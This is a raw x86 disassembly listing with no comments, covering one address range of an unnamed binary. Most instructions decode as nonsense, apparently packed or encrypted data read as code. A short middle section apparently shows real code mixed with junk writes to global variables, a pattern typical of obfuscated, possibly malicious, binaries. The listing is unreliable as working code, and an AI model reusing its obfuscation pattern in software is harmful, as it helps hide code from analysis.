  40306a:	test   BYTE PTR [esi],ch
  40306c:	fwait
  40306d:	aad    0x1a
  40306f:	loopne 0x4030e1
  403071:	popf   
  403072:	cmp    al,0x5d
  403074:	bswap  esi
  403076:	in     al,dx
  403077:	mov    ecx,0xc124a700
  40307c:	mov    al,0xf4
  40307e:	xor    cl,BYTE PTR [edx]
  403080:	cmp    al,0x58
  403082:	into   
  403083:	shl    esi,1
  403085:	jb     0x4030a8
  403087:	xchg   edx,eax
  403088:	mov    ds,WORD PTR [esi-0x2e]
  40308b:	sub    eax,0xa61fe829
  403090:	mov    al,ds:0x2ab4ce2f
  403095:	jno    0x4030fd
  403097:	dec    ecx
  403098:	mov    dl,BYTE PTR [edx]
  40309a:	xchg   esp,eax
  40309b:	pop    es
  40309c:	iret   
  40309d:	xchg   ebp,eax
  40309e:	gs jae 0x4030c2
  4030a1:	pop    ds
  4030a2:	cs fucomip st,st(1)
  4030a5:	mov    ebx,0xfb2dd9a4
  4030aa:	ins    BYTE PTR es:[edi],dx
  4030ab:	add    bl,dl
  4030ad:	xor    bh,BYTE PTR [ebx+edx*1+0xa]
  4030b1:	nop
  4030b2:	xchg   ah,dh
  4030b4:	imul   edx,DWORD PTR [ebp+0x39],0x7d2cfe7a
  4030bb:	iret   
  4030bc:	pusha  
  4030bd:	xchg   ecx,eax
  4030be:	into   
  4030bf:	sub    edi,DWORD PTR [eax-0x36]
  4030c2:	xchg   ecx,eax
  4030c3:	mov    al,ds:0x786b900b
  4030c8:	adc    esp,DWORD PTR [ebp+edx*4+0x7a]
  4030cc:	mov    esp,0x74cb8491
  4030d1:	fwait
  4030d2:	repz or dh,BYTE PTR [edx-0x157eea81]
  4030d9:	dec    esi
  4030da:	aas    
  4030db:	shr    BYTE PTR [ebx-0x18],0xc5
  4030df:	xor    dh,BYTE PTR [edx-0x67]
  4030e2:	test   al,0x55
  4030e4:	add    BYTE PTR [edx+edx*8+0x6e],ch
  4030e8:	enter  0x2bb5,0x77
  4030ec:	add    al,0x1a
  4030ee:	xlat   BYTE PTR ds:[ebx]
  4030ef:	and    ah,ah
  4030f1:	push   0x7b
  4030f3:	sub    al,0x92
  4030f5:	cdq    
  4030f6:	loopne 0x403095
  4030f8:	fild   DWORD PTR [edx+0xde0eaf0]
  4030fe:	in     eax,0x21
  403100:	xchg   DWORD PTR [eax],esi
  403102:	addr16 dec esp
  403104:	sub    DWORD PTR [eax-0xb],0x1e
  403108:	push   es
  403109:	in     eax,dx
  40310a:	fdiv   DWORD PTR [edi+0x10]
  40310d:	push   ss
  40310e:	sahf   
  40310f:	dec    ebp
  403110:	add    esp,eax
  403112:	(bad)  
  403113:	retf   0x16f3
  403116:	mov    DWORD PTR [ecx],ecx
  403118:	aad    0x7c
  40311a:	or     eax,0x4c88d1e1
  40311f:	je     0x40313b
  403121:	push   ebx
  403122:	jo     0x403133
  403124:	adc    BYTE PTR [ebx-0x57e37a74],bl
  40312a:	cld    
  40312b:	mov    bh,0x12
  40312d:	sbb    al,0x9b
  40312f:	es jmp 0x403149
  403132:	daa    
  403133:	jmp    0x4413:0xa12e624e
  40313a:	pop    es
  40313b:	(bad)  
  40313c:	out    dx,al
  40313d:	mov    bh,BYTE PTR ds:0xa5a275ee
  403143:	mov    ?,esi
  403145:	pop    ss
  403146:	aas    
  403147:	fsubr  DWORD PTR [esi+edi*1]
  40314a:	fidivr WORD PTR [edx+0x61]
  40314d:	fimul  WORD PTR [edx]
  40314f:	push   ebx
  403150:	jp     0x403168
  403152:	xor    al,0xbe
  403154:	(bad)  
  403155:	push   edi
  403156:	test   dh,ah
  403158:	xchg   ebp,eax
  403159:	mov    ds:0xed4d080f,al
  40315e:	(bad)  [ebp-0x1798ae4d]
  403164:	mov    eax,0xb9310324
  403169:	pop    ss
  40316a:	(bad)  
  40316b:	sub    eax,0x1be988d3
  403170:	fisttp WORD PTR ds:0x35b702d8
  403176:	jl     0x4031dd
  403178:	loope  0x403162
  40317a:	leave  
  40317b:	sbb    al,0xbb
  40317d:	push   ebp
  40317e:	push   ebx
  40317f:	(bad)  
  403180:	nop
  403181:	jbe    0x403138
  403183:	int3   
  403184:	scas   al,BYTE PTR es:[edi]
  403185:	repnz mov DWORD PTR [edi],ebp
  403188:	dec    ecx
  403189:	xor    BYTE PTR [ecx],bl
  40318b:	pop    edx
  40318c:	pop    ds
  40318d:	xchg   ebp,eax
  40318e:	enter  0xea3a,0x91
  403192:	les    ebp,FWORD PTR [ebp+0x2da64d6c]
  403198:	pop    ecx
  403199:	std    
  40319a:	mov    dh,BYTE PTR [ebx+ecx*1+0x6b]
  40319e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40319f:	outs   dx,BYTE PTR ds:[esi]
  4031a0:	std    
  4031a1:	mov    edx,0xbda57394
  4031a6:	adc    al,0xef
  4031a8:	pop    eax
  4031a9:	adc    al,0x13
  4031ab:	jbe    0x4031e9
  4031ad:	rcl    edx,cl
  4031af:	push   ebx
  4031b0:	sbb    al,0x5f
  4031b2:	int    0xa
  4031b4:	sbb    eax,0x805e1260
  4031b9:	js     0x4031ec
  4031bb:	xchg   ebx,eax
  4031bc:	xor    dl,bl
  4031be:	pop    edx
  4031bf:	sub    dh,BYTE PTR [ecx-0x1d]
  4031c2:	ss mov ecx,0x1cda8fb5
  4031c8:	xor    esp,DWORD PTR [esi]
  4031ca:	sub    al,0xfa
  4031cc:	push   ecx
  4031cd:	(bad)  
  4031cf:	ror    esp,1
  4031d1:	xor    eax,0x569c3735
  4031d6:	jle    0x40324f
  4031d8:	jg     0x403239
  4031da:	js     0x403190
  4031dc:	fwait
  4031dd:	leave  
  4031de:	xchg   esi,eax
  4031df:	jp     0x40323e
  4031e1:	fwait
  4031e2:	dec    ebp
  4031e3:	shl    BYTE PTR [ecx-0x59],cl
  4031e6:	shl    edi,cl
  4031e8:	inc    ebp
  4031e9:	push   edi
  4031ea:	jmp    0x3315f32c
  4031ef:	test   eax,0xa2c5b4e2
  4031f4:	cmp    DWORD PTR [ebp+0x2a82222],edi
  4031fa:	mov    ecx,0xf57573c0
  4031ff:	adc    ecx,DWORD PTR [ecx-0x7]
  403202:	sub    eax,0xb525f740
  403207:	stos   DWORD PTR es:[edi],eax
  403208:	pop    esi
  403209:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40320a:	sbb    BYTE PTR [eax+0x1a],dh
  40320d:	mov    DWORD PTR [eax],esi
  40320f:	jg     0x403277
  403211:	data16 and ah,BYTE PTR [eax+0x43]
  403215:	js     0x4031a8
  403217:	push   0xffffffba
  403219:	xor    bh,BYTE PTR [ebx-0x44]
  40321c:	dec    edx
  40321d:	mov    WORD PTR [ebx+0x6236d41c],cs
  403223:	imul   ebp,DWORD PTR [ebx-0x6106c5d],0xfffffff6
  40322a:	out    0x2d,eax
  40322c:	cs jbe 0x40328d
  40322f:	sbb    BYTE PTR [eax+ecx*1+0x406c8cb3],bh
  403236:	test   BYTE PTR [eax],bl
  403238:	test   eax,0x7c821240
  40323d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40323e:	int3   
  40323f:	je     0x403277
  403241:	fstp   TBYTE PTR [edi]
  403243:	shr    BYTE PTR [edx+0x7655c3c0],cl
  403249:	or     ecx,DWORD PTR [ebx]
  40324b:	sti    
  40324c:	loope  0x403258
  40324e:	jmp    0x4b98:0xccb84815
  403255:	inc    edx
  403256:	int3   
  403257:	retf   
  403258:	add    eax,0x8e1d2b31
  40325d:	mov    es,eax
  40325f:	call   0x857a076d
  403264:	(bad)  
  403265:	(bad)  
  403266:	imul   edi,DWORD PTR [eax+0x38],0x14
  40326a:	mov    esp,0x1bb348cb
  40326f:	and    DWORD PTR [eax+0x53],esi
  403272:	pop    edi
  403273:	add    eax,0x6cf5b8ac
  403278:	repnz push cs
  40327a:	and    dh,dh
  40327c:	mov    gs,WORD PTR [ebx]
  40327e:	xchg   edi,eax
  40327f:	jge    0x4032a5
  403281:	iret   
  403282:	test   eax,0x8bfcf09d
  403287:	pop    ebx
  403288:	outs   dx,DWORD PTR ds:[esi]
  403289:	mov    esp,0x6ae507cb
  40328e:	lods   al,BYTE PTR ds:[esi]
  40328f:	mov    ds:0x7513196c,eax
  403294:	push   eax
  403295:	add    BYTE PTR [eax+0x53],ch
  403298:	mov    ds:0x59a35fb9,al
  40329d:	add    ecx,DWORD PTR [edi+0x3fc453d4]
  4032a3:	sti    
  4032a4:	fist   DWORD PTR [ebp+0x11972f3f]
  4032aa:	pop    edx
  4032ab:	cmp    DWORD PTR [edi+eax*1-0x3431b136],0x4efe33c4
  4032b6:	mov    edx,0xd6785a1b
  4032bb:	xchg   DWORD PTR [ecx-0x27],esp
  4032be:	lock aaa 
  4032c0:	or     eax,DWORD PTR [ecx]
  4032c2:	loop   0x403342
  4032c4:	push   0x6d2c90db
  4032c9:	pusha  
  4032ca:	fbld   TBYTE PTR [esi]
  4032cc:	lods   eax,DWORD PTR ds:[esi]
  4032cd:	lahf   
  4032ce:	jle    0x4032e5
  4032d0:	push   esi
  4032d1:	mov    al,0x9f
  4032d3:	adc    BYTE PTR [ecx-0x49824db9],cl
  4032d9:	lock push edx
  4032db:	mov    ds:0x82d08657,eax
  4032e0:	(bad)  
  4032e1:	dec    eax
  4032e2:	aas    
  4032e3:	sub    ebp,DWORD PTR [edi-0x41e7fe4c]
  4032e9:	and    al,0xa4
  4032eb:	fdivrp st(0),st
  4032ed:	push   esp
  4032ee:	xor    ecx,eax
  4032f0:	fwait
  4032f1:	jae    0x40327f
  4032f3:	pop    ebx
  4032f4:	push   0xffffffb9
  4032f6:	add    DWORD PTR [ebx-0x21],esp
  4032f9:	lahf   
  4032fa:	push   eax
  4032fb:	and    ecx,DWORD PTR [eax+0x76]
  4032fe:	sti    
  4032ff:	mov    al,0xb0
  403301:	xlat   BYTE PTR ds:[ebx]
  403302:	adc    bh,BYTE PTR ds:0x7c85e831
  403308:	scas   eax,DWORD PTR es:[edi]
  403309:	retf   
  40330a:	es dec esi
  40330c:	call   0xa95eb9ad
  403311:	jne    0x40332c
  403313:	cmp    cl,ah
  403315:	not    DWORD PTR ds:[ecx]
  403318:	jmp    0x403367
  40331a:	gs jmp 0xf370e7ba
  403320:	sar    esp,cl
  403322:	sbb    esi,DWORD PTR [ebp-0x7f]
  403325:	popf   
  403326:	jle    0x40332d
  403328:	mov    esp,0xa5bbce50
  40332d:	ds push ss
  40332f:	mov    cl,0x84
  403331:	loopne 0x403379
  403333:	hlt    
  403334:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  403336:	test   DWORD PTR [edx],0xe1dc5674
  40333c:	adc    ecx,ecx
  40333e:	rcr    BYTE PTR [edi+0x26],cl
  403341:	cwde   
  403342:	mov    dl,0x45
  403344:	or     eax,0x337e7f27
  403349:	nop
  40334a:	loopne 0x4033c4
  40334c:	(bad)  
  40334d:	push   esi
  40334e:	dec    ecx
  40334f:	dec    esp
  403350:	cmc    
  403351:	test   BYTE PTR [eax],al
  403353:	lock mov BYTE PTR [ecx+edx*4-0x64],dl
  403358:	(bad)  ds:0xa7b47f44
  40335e:	scas   al,BYTE PTR es:[edi]
  40335f:	fidiv  WORD PTR [edx]
  403361:	mov    DWORD PTR [esi-0x4e],ebp
  403364:	(bad)  
  403366:	js     0x40339a
  403368:	fstp   QWORD PTR [edx]
  40336a:	push   ecx
  40336b:	dec    BYTE PTR ds:0x4a51d0b0
  403371:	loopne 0x4033aa
  403373:	jg     0x4033e1
  403375:	adc    eax,0x8d02a3f9
  40337a:	cmp    eax,0xf4addd2b
  403380:	rol    BYTE PTR [esi+edx*8+0x4f89dabd],0xff
  403388:	sub    DWORD PTR [eax-0x4e],ebx
  40338b:	pop    esp
  40338c:	sub    ebp,DWORD PTR [edi-0x1c]
  40338f:	popa   
  403390:	xor    esi,DWORD PTR [esi+0xbf42202]
  403396:	add    edx,DWORD PTR [eax]
  403398:	out    0xed,al
  40339a:	pop    ebp
  40339b:	xor    ch,cl
  40339d:	or     al,0xc4
  40339f:	cli    
  4033a0:	inc    edi
  4033a1:	xlat   BYTE PTR ds:[ebx]
  4033a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033a3:	xor    al,0xb3
  4033a5:	and    eax,0x97568e0f
  4033aa:	cmp    al,0xae
  4033ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033ad:	rol    ebx,cl
  4033af:	xchg   esp,eax
  4033b0:	xchg   DWORD PTR [esi-0x8c21b26],eax
  4033b6:	(bad)  
  4033b7:	imul   ecx,DWORD PTR [edi-0x10],0xad0af14e
  4033be:	add    eax,0x7792e76a
  4033c3:	les    edx,FWORD PTR [esi-0x63fff322]
  4033c9:	aad    0x5b
  4033cb:	mov    ch,0x43
  4033cd:	and    BYTE PTR [ebx-0x1370843a],ch
  4033d3:	push   0xfffffff3
  4033d5:	inc    esi
  4033d6:	data16 xlat BYTE PTR ds:[ebx]
  4033d8:	jg     0x40342b
  4033da:	test   BYTE PTR [esi-0x2b],0x44
  4033de:	rcr    DWORD PTR [edi-0x4db104e3],cl
  4033e4:	adc    ebp,DWORD PTR [esi]
  4033e6:	lods   al,BYTE PTR ds:[esi]
  4033e7:	lea    eax,[edi-0x48]
  4033ea:	mov    ch,0xfe
  4033ec:	and    cl,dl
  4033ee:	cwde   
  4033ef:	jmp    0x403460
  4033f1:	sbb    al,0xf1
  4033f3:	xchg   dl,cl
  4033f5:	mov    edx,esp
  4033f7:	or     DWORD PTR [eax-0x683bd9ec],0xffffffc1
  4033fe:	xchg   BYTE PTR [ecx+0x76351435],dh
  403404:	lds    esi,FWORD PTR [ebp-0x5b]
  403407:	je     0x403410
  403409:	loop   0x4033e5
  40340b:	push   0xfffffff3
  40340d:	mov    bl,0x2e
  40340f:	das    
  403410:	pop    esi
  403411:	shl    BYTE PTR [edx],1
  403413:	xor    al,BYTE PTR [edi+0x10ae98d1]
  403419:	pop    edi
  40341a:	fs rol al,0x2e
  40341e:	push   ebx
  40341f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403420:	(bad)  
  403421:	xlat   BYTE PTR ds:[ebx]
  403422:	inc    esp
  403423:	stc    
  403424:	xor    al,0x6a
  403426:	sar    BYTE PTR [esi],1
  403428:	xor    ch,BYTE PTR [ebx]
  40342a:	loope  0x40344e
  40342c:	iret   
  40342d:	test   ax,0x1783
  403431:	cmp    eax,0xe2449c47
  403436:	sbb    al,0xf6
  403438:	jae    0x403404
  40343a:	outs   dx,DWORD PTR ds:[esi]
  40343b:	out    0xb1,al
  40343d:	retf   0x876f
  403440:	push   edx
  403441:	jmp    0x3a80:0x9ea408
  403448:	jnp    0x40340b
  40344a:	pop    eax
  40344b:	bnd ja 0x40343a
  40344e:	ret    0x89ae
  403451:	mov    cl,0xf7
  403453:	add    al,BYTE PTR ds:0xa4760626
  403459:	xlat   BYTE PTR ds:[ebx]
  40345a:	add    al,0x77
  40345c:	jle    0x403412
  40345e:	ja     0x4034cb
  403460:	sti    
  403461:	sbb    edi,DWORD PTR [ecx]
  403463:	out    0xfd,al
  403465:	or     BYTE PTR [edi-0x246bfbb],cl
  40346b:	xchg   DWORD PTR [ecx+0x37],ecx
  40346e:	fneni(8087 only) 
  403470:	sub    eax,0x22b9a136
  403475:	push   esp
  403476:	dec    esp
  403477:	clc    
  403478:	retf   0x5f01
  40347b:	sub    BYTE PTR [eax],0x67
  40347e:	aam    0x13
  403480:	or     al,0x4e
  403482:	push   eax
  403483:	push   esi
  403484:	cld    
  403485:	push   ebp
  403486:	sub    BYTE PTR [edx-0x26],dl
  403489:	pop    eax
  40348a:	pop    es
  40348b:	inc    edx
  40348c:	iret   
  40348d:	inc    edx
  40348e:	sbb    eax,0x3f36c93f
  403493:	push   ds
  403494:	fstp   DWORD PTR [edi+0x1c383fb9]
  40349a:	or     al,0x82
  40349c:	mov    BYTE PTR [ebx+0x48],bh
  40349f:	mov    BYTE PTR [ebp-0x2241afd],cl
  4034a5:	push   eax
  4034a6:	adc    eax,0x221bb914
  4034ab:	ret    
  4034ac:	adc    esi,DWORD PTR [ebx+0x63459706]
  4034b2:	ret    
  4034b3:	in     al,dx
  4034b4:	out    dx,al
  4034b5:	fcmovb st,st(3)
  4034b7:	inc    esp
  4034b8:	not    BYTE PTR [ebp-0x1271cb85]
  4034be:	div    bh
  4034c0:	out    dx,al
  4034c1:	xor    BYTE PTR [esi+0x6d6ea42c],0x35
  4034c8:	ja     0x403539
  4034ca:	mov    esi,0xb15182b3
  4034cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034d0:	lds    ebp,FWORD PTR [edi+0x5a391e38]
  4034d6:	ret    
  4034d7:	stc    
  4034d8:	jb     0x40349f
  4034da:	cmc    
  4034db:	stc    
  4034dc:	pop    gs
  4034de:	add    al,0x5d
  4034e0:	popa   
  4034e1:	mov    WORD PTR [edx],gs
  4034e3:	loopne 0x403557
  4034e5:	or     bl,BYTE PTR [ebp+0x45bcf249]
  4034eb:	mov    ebx,DWORD PTR [eax-0x15ac7e28]
  4034f1:	(bad)
  4034f4:	xchg   esp,eax
  4034f5:	push   ebp
  4034f6:	ror    BYTE PTR [ecx-0x5e],1
  4034f9:	jg     0x40356d
  4034fb:	cmp    dh,dl
  4034fd:	push   ds
  4034fe:	and    dl,cl
  403500:	pop    ecx
  403501:	(bad)  
  403503:	dec    ebp
  403504:	sbb    DWORD PTR [ebp-0x41],0x12
  403508:	js     0x4034fb
  40350a:	ins    DWORD PTR es:[edi],dx
  40350b:	jge    0x403516
  40350d:	sbb    eax,ecx
  40350f:	and    al,0x4b
  403511:	push   es
  403512:	int3   
  403513:	retf   
  403514:	ins    BYTE PTR es:[edi],dx
  403515:	mov    dx,0xfe66
  403519:	lock aad 0x9f
  40351c:	leave  
  40351d:	inc    esp
  40351e:	mov    eax,0xbdf59e04
  403523:	sub    ebp,esi
  403525:	imul   BYTE PTR [ebx]
  403527:	xchg   ebp,eax
  403528:	lods   al,BYTE PTR ds:[esi]
  403529:	ret    
  40352a:	or     ebx,DWORD PTR [ebp+0x550c4cd3]
  403530:	push   cs
  403531:	and    ebp,DWORD PTR [eax+eax*2+0x17426bed]
  403538:	aam    0xec
  40353a:	js     0x403586
  40353c:	test   DWORD PTR [ebp+0x11],ecx
  40353f:	dec    ebp
  403540:	jge    0x403530
  403542:	icebp  
  403543:	lock xchg ebx,eax
  403545:	xor    eax,0xa3e93a4d
  40354a:	imul   ebp,esp,0xfffffff4
  40354d:	xor    dh,BYTE PTR [esi+0x64ef8147]
  403553:	out    0x78,eax
  403555:	sub    esi,DWORD PTR [ecx+eiz*8-0x25230a85]
  40355c:	lods   al,BYTE PTR ds:[esi]
  40355d:	sub    ebx,esp
  40355f:	and    DWORD PTR [ebp+0x104ee012],0x62dfe18f
  403569:	and    ah,BYTE PTR [ebx]
  40356b:	jbe    0x40358f
  40356d:	outs   dx,DWORD PTR ds:[esi]
  40356e:	sbb    ah,BYTE PTR [ebp+0x5f19f641]
  403574:	jns    0x403559
  403576:	mov    ch,0x2e
  403578:	out    0x54,eax
  40357a:	pop    eax
  40357b:	cmp    al,0xf9
  40357d:	xchg   ebx,eax
  40357e:	or     al,0xe1
  403580:	xchg   ebx,eax
  403581:	xchg   edx,eax
  403582:	sub    bh,0xfb
  403585:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403586:	inc    esp
  403587:	jno    0x403543
  403589:	jle    0x40352c
  40358b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40358c:	pushf  
  40358d:	fwait
  40358e:	pop    es
  40358f:	(bad)  
  403590:	test   eax,0x4f29bb20
  403595:	mov    bh,0x46
  403597:	in     al,dx
  403598:	mov    eax,ds:0x40245210
  40359d:	or     ebx,DWORD PTR [eax+ecx*1+0x6d]
  4035a1:	mov    ebp,0xec220460
  4035a6:	xor    eax,esp
  4035a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035a9:	mov    ebp,DWORD PTR [ecx]
  4035ab:	push   edi
  4035ac:	loopne 0x403628
  4035ae:	mov    esp,0xf5fa2fa2
  4035b3:	ret    0xfab5
  4035b6:	aad    0x1d
  4035b8:	add    DWORD PTR [edi+0x2562499a],edx
  4035be:	push   ss
  4035bf:	repnz mov bh,0xcb
  4035c2:	pushf  
  4035c3:	adc    al,0x27
  4035c5:	jg     0x40357c
  4035c7:	cld    
  4035c8:	imul   edx,eax,0xffffffc6
  4035cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035cc:	repz dec edi
  4035ce:	push   esp
  4035cf:	mov    dh,0x91
  4035d1:	fs or  bh,bl
  4035d4:	mov    ebx,0x8ef14e9c
  4035d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035da:	dec    eax
  4035db:	ret    0x6790
  4035de:	in     eax,dx
  4035df:	into   
  4035e0:	xor    eax,0x7cd54fff
  4035e5:	inc    ebp
  4035e6:	add    eax,eax
  4035e8:	sahf   
  4035e9:	push   ss
  4035ea:	mov    eax,ds:0xbbb23c35
  4035ef:	pop    ebx
  4035f0:	jmp    0x40366c
  4035f2:	and    esi,DWORD PTR [edx]
  4035f4:	rcl    DWORD PTR [ecx],cl
  4035f6:	mov    DWORD PTR [ebp-0xa0],0xf89c85b9
  403600:	mov    eax,ds:0x42a27e
  403605:	or     DWORD PTR ds:0x42a27a,eax
  40360b:	mov    eax,DWORD PTR [ebp-0x14]
  40360e:	mov    DWORD PTR [ebp-0x9c],eax
  403614:	adc    DWORD PTR ds:0x42a29a,ecx
  40361a:	mov    eax,DWORD PTR [ebp-0x18]
  40361d:	mov    DWORD PTR [ebp-0x98],eax
  403623:	sbb    DWORD PTR ds:0x42a28a,0x5122
  40362d:	mov    eax,DWORD PTR [ebp-0x2c]
  403630:	xor    eax,esi
  403632:	add    eax,edi
  403634:	or     DWORD PTR ds:0x42a27a,0x42a2ea
  40363e:	mov    DWORD PTR [ebp-0x94],eax
  403644:	lea    eax,[ebp-0x48]
  403647:	mov    DWORD PTR [ebp-0x90],eax
  40364d:	mov    eax,DWORD PTR [ebp-0xa0]
  403653:	xor    eax,esi
  403655:	sbb    DWORD PTR ds:0x42a2f2,0x42a2da
  40365f:	add    eax,edi
  403661:	or     DWORD PTR ds:0x42a2ee,0x42a256
  40366b:	mov    DWORD PTR [ebp-0xa0],eax
  403671:	sub    DWORD PTR ds:0x42a272,0x1d49
  40367b:	lea    eax,[ebp-0xa0]
  403681:	push   eax
  403682:	neg    eax
  403684:	mov    eax,DWORD PTR [ebp+0xc]
  403687:	sub    DWORD PTR ds:0x42a2aa,0x2c11
  403691:	xor    eax,esi
  403693:	add    eax,edi
  403695:	push   eax
  403696:	mov    eax,ds:0x42943e
  40369b:	push   0x429394
  4036a0:	mov    DWORD PTR ds:0x42a286,0x524d
  4036aa:	push   DWORD PTR [eax]
  4036ac:	call   0x4084f6
  4036b1:	xor    edx,edx
  4036b3:	add    edx,DWORD PTR ds:0x42a29e
  4036b9:	and    DWORD PTR ds:0x42a28e,edx
  4036bf:	mov    ebx,DWORD PTR [ebp-0x14]
  4036c2:	mov    eax,DWORD PTR [ebp-0x18]
  4036c5:	mov    DWORD PTR [ebp-0x58],eax
  4036c8:	mov    eax,ds:0x42a306
  4036cd:	mov    edx,DWORD PTR ds:0x42a34e
  4036d3:	sub    edx,eax
  4036d5:	sub    eax,DWORD PTR [eax+edx*1]
  4036d8:	mov    DWORD PTR [ebp-0x34],0xf89c853f
  4036df:	mov    eax,0xf89c85bb
  4036e4:	mov    DWORD PTR [ebp-0x1c],eax
  4036e7:	xor    DWORD PTR ds:0x42a286,0x37ec
  4036f1:	lea    ecx,[eax-0x16]
  4036f4:	and    DWORD PTR ds:0x42a2e2,0x0
  4036fe:	jmp    0x403710
  403703:	mov    edx,DWORD PTR ds:0x42a2e2
  403709:	inc    edx
  40370a:	mov    DWORD PTR ds:0x42a2e2,edx
  403710:	cmp    DWORD PTR ds:0x42a2e2,0x18
  403717:	jae    0x40376b
  40371d:	cmp    DWORD PTR ds:0x42a2e2,0x4
  403724:	jl     0x40376b
  40372a:	jmp    0x40374c
  40372f:	push   DWORD PTR [ebp-0x20]
  403732:	push   DWORD PTR [ebp-0x18]
  403735:	push   DWORD PTR [ebp-0x20]
  403738:	push   DWORD PTR [ebp-0x18]
  40373b:	push   DWORD PTR [ebp-0x14]
  40373e:	push   DWORD PTR [ebp-0x20]
  403741:	push   0x429247
  403746:	call   DWORD PTR ds:0x42a3d6
  40374c:	cmp    DWORD PTR ds:0x42a2e2,0x3
  403753:	jne    0x403766
  403759:	mov    edx,DWORD PTR ds:0x42a2e2
  40375f:	inc    edx
  403760:	mov    DWORD PTR ds:0x42a2e2,edx
  403766:	jmp    0x403703
  40376b:	mov    DWORD PTR [ebp-0x28],ecx
  40376e:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  403775:	neg    DWORD PTR ds:0x42a25e
  40377b:	mov    DWORD PTR [ebp-0x8],eax
  40377e:	xor    edx,edx
  403780:	or     edx,DWORD PTR ds:0x42a2da
  403786:	xor    DWORD PTR ds:0x42a29a,edx
  40378c:	mov    eax,DWORD PTR [ebp-0x10]
  40378f:	neg    edx
  403791:	xor    eax,esi
  403793:	mov    edx,0xffcd8d8f
  403798:	sub    edx,eax
  40379a:	mov    eax,ds:0x42a2fe
  40379f:	mov    DWORD PTR [ebp-0xc],edx
  4037a2:	mov    DWORD PTR [ebp-0x18],0xf89c85be
  4037a9:	mov    eax,DWORD PTR [ebp-0x8]
  4037ac:	mov    DWORD PTR ds:0x42a2ce,0x6d9f
  4037b6:	mov    DWORD PTR [ebp-0x3c],ebx
  4037b9:	mov    DWORD PTR ds:0x42a286,0xb52
  4037c3:	cmp    eax,ecx
  4037c5:	mov    DWORD PTR ds:0x42a2d2,0x1900
  4037cf:	je     0x408220
  4037d5:	xor    DWORD PTR ds:0x42a2b6,edx
  4037db:	mov    eax,DWORD PTR [ebp-0x10]
  4037de:	jmp    0x405b37
  4037e3:	or     al,BYTE PTR es:[edx-0x17]
  4037e7:	inc    edx
  4037e8:	mov    eax,ds:0x1d8d8286
  4037ed:	ins    DWORD PTR es:[edi],dx
  4037ee:	mov    al,ds:0xab747605
  4037f3:	inc    edi
  4037f4:	pop    esi
  4037f5:	add    DWORD PTR [ebx-0x7c7ca1b9],0xffffffcd
  4037fc:	or     esp,ecx
  4037fe:	or     ah,BYTE PTR [edx-0x12]
  403801:	sahf   
  403802:	ret    0x909b
  403805:	sbb    dh,ah
  403807:	or     edx,DWORD PTR [edi+0x6]
  40380a:	inc    ebx
  40380b:	adc    eax,0x4a5059ba
  403810:	jmp    0x6da0b493
  403815:	das    
  403816:	mov    ebp,0x89bb62a0
  40381b:	std    
  40381c:	aad    0x93
  40381e:	push   eax
  40381f:	leave  
  403820:	jnp    0x403817
  403822:	xor    eax,0x6f511ae4
  403827:	ds ins DWORD PTR es:[edi],dx
  403829:	mov    ah,0x59
  40382b:	dec    esi
  40382c:	out    dx,eax
  40382d:	xchg   ebp,eax
  40382e:	sub    ebp,0xffffffae
  403831:	dec    edx
  403832:	enter  0x70d6,0xbf
  403836:	dec    edx
  403837:	stc    
  403838:	enter  0xf451,0xe6
  40383c:	add    ebp,ebp
  40383e:	mov    cl,0xbb
  403840:	mov    bh,0xde
  403842:	dec    esp
  403843:	push   esp
  403844:	push   esi
  403845:	adc    DWORD PTR [di+0x2b],ebp
  403849:	adc    BYTE PTR [ebp+0x9bcc384],dh
  40384f:	pop    es
  403850:	push   edx
  403851:	not    ebx
  403853:	(bad)  
  403854:	sub    cl,BYTE PTR [ebx]
  403856:	cmc    
  403857:	outs   dx,DWORD PTR ds:[esi]
  403858:	xchg   edi,eax
  403859:	pop    ecx
  40385a:	das    
  40385b:	jnp    0x40384d
  40385d:	or     dh,BYTE PTR [ebx]
  40385f:	lea    ebx,[edi-0x13]
  403862:	in     eax,0xa5
  403864:	imul   ecx,DWORD PTR [edx],0xffffffb0
  403867:	imul   esp,DWORD PTR [ecx-0x4c4cc6c2],0xffffffac
  40386e:	shl    BYTE PTR [edi+0x1b2fa34f],1
  403874:	push   esi
  403875:	lods   al,BYTE PTR ds:[esi]
  403876:	(bad)
  40387b:	loop   0x40382e
  40387d:	mov    cl,0x5b
  40387f:	ss xchg esp,eax
  403881:	call   0xa779d9cf
  403886:	xchg   ecx,eax
  403887:	bound  edx,QWORD PTR [ebx+eiz*1-0x6]
  40388b:	sbb    al,0x8
  40388d:	mov    bh,0xa9
  40388f:	dec    esp
  403890:	push   edi
  403891:	nop
  403892:	sub    bh,BYTE PTR [edx-0x30545da1]
  403898:	fcom   DWORD PTR [eax+0x3d995d0d]
  40389e:	xor    dh,BYTE PTR [ebp-0x59]
  4038a1:	ret    
  4038a2:	adc    al,0x8a
  4038a4:	enter  0x6d92,0xc6
  4038a8:	xchg   esp,eax
  4038a9:	mov    dh,0xbf
  4038ab:	and    al,0x8
  4038ad:	inc    ecx
  4038ae:	cdq    
  4038af:	lahf   
  4038b0:	xor    DWORD PTR [ebx+0xa4f96b0],0x1f
  4038b7:	push   ss
  4038b8:	dec    ebx
  4038b9:	cwde   
  4038ba:	and    eax,0x2806bff
  4038bf:	sbb    esp,0x2
  4038c2:	jge    0x403906
  4038c4:	push   esi
  4038c5:	xchg   edi,eax
  4038c6:	dec    esp
  4038c7:	mov    ch,0x83
  4038c9:	mov    BYTE PTR [edx],bh
  4038cb:	sti    
  4038cc:	dec    ebp
  4038cd:	push   edi
  4038ce:	iret   
  4038cf:	pop    edi
  4038d0:	cmp    DWORD PTR [ebp-0x35945fd5],esp
  4038d6:	dec    edi
  4038d7:	push   edx
